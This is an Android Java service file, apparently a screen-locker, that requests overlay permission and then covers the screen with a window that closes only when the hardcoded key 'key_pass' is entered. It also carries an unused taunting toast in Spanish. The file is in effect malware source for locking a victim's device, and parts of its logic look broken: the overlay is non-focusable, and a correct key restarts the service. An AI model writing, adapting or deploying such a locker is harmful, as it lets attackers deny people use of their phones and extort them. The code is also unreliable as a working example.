package com.termuxhackers.id;

import android.app.Service; import android.content.Intent; import android.net.Uri; import android.os.Build; import android.os.IBinder; import android.provider.Settings; import android.view.LayoutInflater; import android.view.View; import android.view.ViewGroup; import android.view.WindowManager; import android.view.WindowManager.LayoutParams; import android.widget.Button; import android.widget.EditText; import android.widget.ImageView; import android.widget.Toast;

public class MyService extends Service { private ImageView chatHead; private EditText e1; private ViewGroup myView; private WindowManager windowManager;

@Override
public void onCreate() {
    super.onCreate();

    if (Build.VERSION.SDK_INT >= 23 && !Settings.canDrawOverlays(this)) {
        Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName()));
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
        stopSelf();
        return;
    }

    this.windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
    LayoutInflater layoutInflater = (LayoutInflater) getSystemService(LAYOUT_INFLATER_SERVICE);

    if (layoutInflater == null || this.windowManager == null) {
        stopSelf();
        return;
    }

    this.myView = (ViewGroup) layoutInflater.inflate(R.layout.main, null);
    this.chatHead = new ImageView(this);
    this.chatHead.setImageResource(android.R.drawable.ic_dialog_info); // Icono genérico
    Button button = this.myView.findViewById(R.id.mainButton1);
    this.e1 = this.myView.findViewById(R.id.mainEditText1);

    button.setOnClickListener(new View.OnClickListener() {
        @Override
        public void onClick(View view) {
            if (e1.getText().toString().equals("key_pass")) {
                windowManager.removeView(myView);
                stopSelf();
                startService(new Intent(MyService.this, MyService.class));
            }
            e1.setText("");
        }
    });

    int layoutFlag = (Build.VERSION.SDK_INT >= 26) ? LayoutParams.TYPE_APPLICATION_OVERLAY : LayoutParams.TYPE_SYSTEM_ALERT;
    LayoutParams layoutParams = new LayoutParams(
            LayoutParams.WRAP_CONTENT, LayoutParams.WRAP_CONTENT,
            layoutFlag, LayoutParams.FLAG_NOT_FOCUSABLE, LayoutParams.FORMAT_CHANGED);
    layoutParams.gravity = 17;
    this.windowManager.addView(this.myView, layoutParams);
}

@Override
public IBinder onBind(Intent intent) {
    return null;
}

private void showToast() {
    Toast.makeText(this, "El Angel caído ha llegado.", Toast.LENGTH_SHORT).show();
}

}


